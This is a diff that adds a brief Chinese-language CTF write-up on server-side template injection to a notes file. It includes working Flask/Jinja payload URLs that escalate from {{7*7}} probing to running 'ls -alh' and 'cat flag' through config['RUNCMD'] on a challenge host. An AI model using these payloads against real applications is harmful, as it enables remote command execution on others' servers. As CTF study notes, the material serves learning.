@@ -161,4 +161,31 @@ rotected的参数变成 \00*\00test3
 ```
 
 ### 0x03 (SSTI)
+
+從網頁完全看不出是GET哪個變數
+
+看了幾篇教學是用name當範例
+
+於是
+
+140.110.112.29:1008?name=123
+
+結果有反應(通靈ㄏㄏ)
+
+先確定是用{{}}來印出變數 (每一種模板不同)
+
+140.110.112.29:1008/?name={{7*7}}
+
+140.110.112.29:1008?name={{request.environ}}
+
+發現是flask
+
+於是
+
+http://140.110.112.29:1008/?name={{ config['RUNCMD']('ls -alh',shell=True) }}
+
+http://140.110.112.29:1008/?name={{ config['RUNCMD']('cat flag',shell=True) }}
+
+[參考文章](https://hellohxk.com/blog/ssti/)
+
 ### 0x04 (XXE)
